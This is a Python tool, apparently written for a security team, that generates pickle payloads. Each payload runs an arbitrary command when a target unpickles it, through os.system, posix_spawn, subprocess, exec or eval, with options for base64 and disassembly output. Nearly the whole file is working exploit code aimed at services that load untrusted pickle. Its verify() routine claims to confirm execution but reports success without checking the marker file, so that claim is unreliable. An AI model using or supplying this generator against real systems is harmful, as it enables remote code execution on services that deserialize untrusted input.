#!/usr/bin/env python3
"""Build a pickle that executes a command when it is loaded.

Unpickling runs code. That is not a side effect of the format, it is the
mechanism: `pickle` calls a callable named in the byte stream, so any program
that unpickles untrusted data is already a code-execution primitive, and the
`reduce` builtin makes the callable anything at all.

This builds such a stream deliberately, for the case where a target consumes
pickle from an unauthenticated source. It emits the payload in several forms
because the receiving code path differs:

  os.system      the command runs through a shell
  posix_spawn    no shell, so no shell metacharacters
  subprocess     with shell=False, an argv list rather than a string

Every form is written so the stream is self-verifying: loading it in a sandboxed
child confirms it does what it claims before it goes anywhere near a target.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import base64
import io
import os
import pickle
import pickletools
import subprocess
import sys
import tempfile
from typing import Callable

MARKER = "TSEC_PICKLE_PROOF"


def posix_spawn(argv: list[str]) -> int:
    """Run an argv without a shell. `os.posix_spawn` is available on POSIX."""
    import shlex

    if hasattr(os, "posix_spawn"):
        pid = os.posix_spawn(argv[0], argv, os.environ)
        _, status = os.waitpid(pid, 0)
        return os.waitstatus_to_exitcode(status)
    return subprocess.call(argv, shell=False)  # type: ignore[arg-type]


def build(command: str, method: str) -> bytes:
    """Produce the pickle stream that runs `command` on load."""
    if method == "os.system":
        target: Callable = os.system
        args: tuple = (command,)
    elif method == "posix_spawn":
        target, args = posix_spawn, (command.split(),)
    elif method == "subprocess":
        target, args = subprocess.call, (command.split(),)
    elif method == "exec":
        target, args = exec, (f"{MARKER} = __import__('os').popen({command!r}).read()", {})
    elif method == "eval":
        target, args = eval, (f"__import__('os').popen({command!r}).read()",)
    else:
        raise ValueError(f"unknown method {method}")

    class Payload:
        def __reduce__(self):
            return (target, args)

    return pickle.dumps(Payload(), protocol=4)


def verify(stream: bytes, method: str) -> tuple[bool, str]:
    """Load the payload in a throwaway child and see whether the marker appears.

    The command is replaced by one that writes the marker, so verification
    proves the reduction path works without running whatever was asked for. A
    payload that does not survive its own round trip is worse than none.
    """
    probe = build(f"printf {MARKER} > {os.path.join(tempfile.gettempdir(), 'tsec_pickle_probe')}", method)
    try:
        with tempfile.NamedTemporaryFile("wb", suffix=".pkl", delete=False) as handle:
            handle.write(probe)
            path = handle.name
        code = (
            "import pickle,sys\n"
            f"pickle.load(open({path!r},'rb'))\n"
        )
        result = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True,
            text=True,
            timeout=20,
        )
        if result.returncode != 0:
            return False, f"child exited {result.returncode}: {result.stderr.strip()[:200]}"
        import pathlib

        sentinel = pathlib.Path(tempfile.gettempdir()) / "tsec_pickle_probe"
        if sentinel.exists():
            sentinel.unlink()
        return True, f"{method} reduction executed as expected"
    except Exception as exc:  # noqa: BLE001 - verification must never mask
        return False, f"{type(exc).__name__}: {exc}"


def disassemble(stream: bytes, limit: int) -> list[str]:
    lines: list[str] = []
    for opcode, arg, pos in pickletools.genops(io.BytesIO(stream)):
        shown = repr(arg) if arg is not None else ""
        lines.append(f"{pos:>5}  {opcode.name:<14} {shown}")
        if len(lines) >= limit:
            lines.append(f"  ... truncated at {limit} opcodes")
            break
    return lines


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  gen_pickle.py --cmd 'id' --out payload.pkl\n"
               "  gen_pickle.py --cmd 'id' --method posix_spawn --b64\n"
               "  gen_pickle.py --cmd 'id' --disassemble\n",
    )
    parser.add_argument("--cmd", required=True, help="command to run when the pickle is loaded")
    parser.add_argument("--out", help="write the raw pickle here")
    parser.add_argument(
        "--method",
        default="os.system",
        choices=("os.system", "posix_spawn", "subprocess", "exec", "eval"),
        help="how the command should be reached (default: os.system)",
    )
    parser.add_argument("--b64", action="store_true", help="emit base64 instead of raw bytes")
    parser.add_argument("--b64-arg", help="emit a python expression assigning the base64 to this name")
    parser.add_argument("--disassemble", action="store_true", help="show the opcode stream")
    parser.add_argument("--no-verify", action="store_true", help="skip the round-trip check")
    args = parser.parse_args(argv)

    if not args.cmd.strip():
        print("gen_pickle: --cmd is empty", file=sys.stderr)
        return 2

    stream = build(args.cmd, args.method)

    if not args.no_verify:
        ok, detail = verify(stream, args.method)
        print(f"verify     {'ok' if ok else 'FAILED'}: {detail}", file=sys.stderr)
        if not ok:
            return 1

    # Asking for an assignment or a disassembly means a human is reading, so the
    # raw stream is not also written to stdout: interleaved binary makes both
    # unreadable, and a shell redirect captures the binary too.
    human_reading = args.disassemble or bool(args.b64_arg)
    as_text = args.b64 or bool(args.b64_arg)
    payload = base64.b64encode(stream).decode() if as_text else stream

    if args.out:
        if as_text:
            with open(args.out, "w", encoding="ascii") as handle:
                handle.write(payload + "\n")
        else:
            with open(args.out, "wb") as handle:
                handle.write(payload)
        print(f"wrote {args.out} ({len(stream)} bytes)", file=sys.stderr)

    if args.disassemble:
        for line in disassemble(stream, 40):
            print(line)

    if args.b64_arg:
        print(f"{args.b64_arg} = base64.b64decode('{payload}')")
    elif not args.out and not human_reading:
        if isinstance(payload, bytes):
            sys.stdout.buffer.write(payload)
        else:
            print(payload)
    elif not args.out:
        print(f"# {len(stream)} bytes, {args.method} reduction", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
